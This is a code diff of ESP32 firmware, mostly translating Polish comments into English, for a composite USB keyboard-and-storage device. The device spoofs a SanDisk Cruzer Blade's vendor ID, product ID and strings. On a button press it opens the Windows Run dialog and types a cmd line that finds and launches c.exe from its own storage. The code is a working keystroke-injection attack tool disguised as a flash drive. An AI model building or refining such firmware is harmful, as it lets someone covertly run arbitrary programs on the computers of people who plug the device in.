@@ -13,14 +13,14 @@
 #include "class/msc/msc.h"
 #include "ff.h"
 
-// Konfiguracja sprzętowa
-#define APP_BUTTON GPIO_NUM_0      // Przycisk BOOT
+// Hardware configuration
+#define APP_BUTTON GPIO_NUM_0      // BOOT button
 #define KEY_DELAY_MS 15
-#define BASE_PATH "/sd"           // Punkt montowania karty SD
+#define BASE_PATH "/sd"            // Mount point for SD card
 static const char *TAG = "Composite Example";
 #define ESP_VOLUME_LABEL "USB_SAM_DISC"
 
-// Deskryptory USB
+// USB endpoint numbers and descriptor lengths
 #define EPNUM_HID   1
 #define EPNUM_MSC   2
 #define TUSB_DESC_TOTAL_LEN (TUD_CONFIG_DESC_LEN + TUD_HID_DESC_LEN + TUD_MSC_DESC_LEN)
@@ -31,6 +31,7 @@ enum {
     ITF_NUM_TOTAL
 };
 
+// USB device descriptor
 static tusb_desc_device_t descriptor_config = {
     .bLength = sizeof(tusb_desc_device_t),
     .bDescriptorType = TUSB_DESC_DEVICE,
@@ -39,43 +40,43 @@ static tusb_desc_device_t descriptor_config = {
     .bDeviceSubClass = MISC_SUBCLASS_COMMON,
     .bDeviceProtocol = MISC_PROTOCOL_IAD,
     .bMaxPacketSize0 = CFG_TUD_ENDPOINT0_SIZE,
-    .idVendor = 0x0781, // VID SanDisk
-    .idProduct = 0x5567, // PID Cruzer Blade
-    .bcdDevice = 0x0100, // Wersja urządzenia 1.00
+    .idVendor = 0x0781, // SanDisk VID
+    .idProduct = 0x5567, // Cruzer Blade PID
+    .bcdDevice = 0x0100, // Device version 1.00
     .iManufacturer = 0x01,
     .iProduct = 0x02,
     .iSerialNumber = 0x03,
     .bNumConfigurations = 0x01
 };
 
-
-// Deskryptor raportu HID (klawiatura)
+// HID report descriptor (keyboard)
 const uint8_t hid_report_descriptor[] = {
     TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(HID_ITF_PROTOCOL_KEYBOARD))
 };
 
-// Konfiguracja USB Composite
+// USB composite configuration descriptor
 static uint8_t const composite_configuration_desc[] = {
-    // Config number, interface count, string index, total length, attribute, power in mA
+    // Config number, interface count, string index, total length, attributes, power in mA
     TUD_CONFIG_DESCRIPTOR(1, ITF_NUM_TOTAL, 0, TUSB_DESC_TOTAL_LEN, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 100),
 
-    // Interfejs HID (Klawiatura)
+    // HID interface (keyboard)
     TUD_HID_DESCRIPTOR(ITF_NUM_HID, 0, false, sizeof(hid_report_descriptor), EPNUM_HID | 0x80, 16, 10),
 
-    // Interfejs MSC (Pamięć masowa)
+    // MSC interface (mass storage)
     TUD_MSC_DESCRIPTOR(ITF_NUM_MSC, 0, EPNUM_MSC, EPNUM_MSC | 0x80, 64),
 };
 
+// USB string descriptors
 static char const *string_desc_arr[] = {
-    (const char[]){0x09, 0x04}, // Język: angielski (USA)
-    "SanDisk",                 // Producent
-    "Cruzer Blade",            // Nazwa produktu
-    "1234567890AB",            // Numer seryjny
-    "HID Interface",            // HID
-    "MSC Interface",            // MSC
+    (const char[]){0x09, 0x04}, // Language: English (US)
+    "SanDisk",                  // Manufacturer
+    "Cruzer Blade",            // Product
+    "1234567890AB",            // Serial number
+    "HID Interface",           // HID interface string
+    "MSC Interface",           // MSC interface string
 };
 
-// Callbacke HID
+// HID callbacks
 uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) {
     return hid_report_descriptor;
 }
@@ -86,7 +87,7 @@ uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_t
     return 0;
 }
 
-// Funkcje klawiatury
+// Keyboard functions
 static void send_key(uint8_t modifier, uint8_t keycode) {
     uint8_t keys[6] = { keycode };
     tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, modifier, keys);
@@ -95,12 +96,12 @@ static void send_key(uint8_t modifier, uint8_t keycode) {
     vTaskDelay(pdMS_TO_TICKS(KEY_DELAY_MS));
 }
 
-// Inicjalizacja karty SD
+// Initialize SD card
 static sdmmc_card_t *sd_card_init(void) {
     sdmmc_host_t host = SDMMC_HOST_DEFAULT();
     sdmmc_slot_config_t slot_config = SDMMC_SLOT_CONFIG_DEFAULT();
-    
-    // Konfiguracja pinów (dostosuj do swojego układu)
+
+    // Configure pins (adjust to your hardware)
     slot_config.width = 1;
 
     slot_config.clk = GPIO_NUM_36;
@@ -119,14 +120,13 @@ static sdmmc_card_t *sd_card_init(void) {
     return card;
 }
 
- 
-static void send_text(const char *text)
-{
-    uint8_t const conv_table[128][2] =  { HID_ASCII_TO_KEYCODE };
+// Send text string as keystrokes
+static void send_text(const char *text) {
+    uint8_t const conv_table[128][2] = { HID_ASCII_TO_KEYCODE };
     while (*text) {
         uint8_t keycode = 0;
-        uint8_t modifier   = 0;
-        if ( conv_table[(uint8_t)(*text)][0] ) modifier = KEYBOARD_MODIFIER_LEFTSHIFT;
+        uint8_t modifier = 0;
+        if (conv_table[(uint8_t)(*text)][0]) modifier = KEYBOARD_MODIFIER_LEFTSHIFT;
         keycode = conv_table[(uint8_t)(*text)][1];
 
         if (keycode) {
@@ -137,17 +137,17 @@ static void send_text(const char *text)
 }
 
 void app_main(void) {
-    // Inicjalizacja karty SD
+    // Initialize SD card
     sdmmc_card_t *sd_card = sd_card_init();
     ESP_LOGI(TAG, "SD Card initialized");
 
-    // Konfiguracja MSC
+    // Configure MSC
     const tinyusb_msc_sdmmc_config_t msc_config = {
         .card = sd_card
     };
     ESP_ERROR_CHECK(tinyusb_msc_storage_init_sdmmc(&msc_config));
 
-    // Inicjalizacja USB
+    // Initialize USB composite device
     const tinyusb_config_t tusb_cfg = {
         .device_descriptor = &descriptor_config,
         .string_descriptor = string_desc_arr,
@@ -158,7 +158,7 @@ void app_main(void) {
     ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
     ESP_LOGI(TAG, "USB Composite Initialized");
 
-    // Konfiguracja przycisku
+    // Configure button
     gpio_config_t btn_config = {
         .pin_bit_mask = BIT64(APP_BUTTON),
         .mode = GPIO_MODE_INPUT,
@@ -166,17 +166,17 @@ void app_main(void) {
     };
     gpio_config(&btn_config);
 
+    // Command to run from USB storage (example for Windows)
     const char *command = "cmd /c for %d in (D E F G H I J K) do if exist %d:\\c (start \"\" %d:\\c\\c.exe %d:\\c\\_internal & goto :eof)\n";
 
-
-    // Główna pętla
-    while(1) {
+    // Main loop
+    while (1) {
         if (gpio_get_level(APP_BUTTON) == 0) {
-            ESP_LOGI(TAG, "Button pressed - sending key");
-            //Send win + R
+            ESP_LOGI(TAG, "Button pressed - sending keys");
+            // Send Win + R
             send_key(KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R);
-            vTaskDelay(pdMS_TO_TICKS(150)); // wait 
-            send_text(command);
+            vTaskDelay(pdMS_TO_TICKS(150)); // Wait for Run dialog
+            send_text(command);             // Send command string
             vTaskDelay(pdMS_TO_TICKS(200)); // Debounce
         }
         vTaskDelay(pdMS_TO_TICKS(10));
